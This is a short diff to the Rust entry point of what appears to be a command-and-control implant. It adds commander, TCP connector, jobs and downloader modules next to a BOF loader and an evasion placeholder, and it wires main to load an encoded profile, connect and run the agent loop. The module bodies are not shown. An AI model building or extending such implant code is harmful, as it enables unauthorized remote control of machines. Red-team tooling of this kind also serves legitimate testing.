@@ -7,15 +7,23 @@ mod config;
 mod crypto;
 mod protocol;
 mod agent;
+mod commander;
+mod connector_tcp;
+mod jobs;
+mod downloader;
 mod bof;
 // __EVASION_MOD__
 
 fn main() {
-    // TODO: Parse config::ENC_PROFILES, decrypt, connect, and enter agent loop.
-    //
-    // Example flow:
-    //   let profile = crypto::decrypt(&config::ENC_PROFILES[0], &key);
-    //   let mut agent = agent::Agent::new(profile);
-    //   agent.run();
-    eprintln!("[__NAME__] agent stub — implement main loop");
+    let profile = config::ENC_PROFILES
+        .first()
+        .map(|bytes| bytes.to_vec())
+        .unwrap_or_default();
+
+    let profile_text = String::from_utf8_lossy(&profile);
+    let first_line = profile_text.lines().next().unwrap_or_default();
+    let connector = connector_tcp::ConnectorTCP::from_profile(first_line);
+
+    let mut agent = agent::Agent::new(profile, Box::new(connector));
+    agent.run();
 }
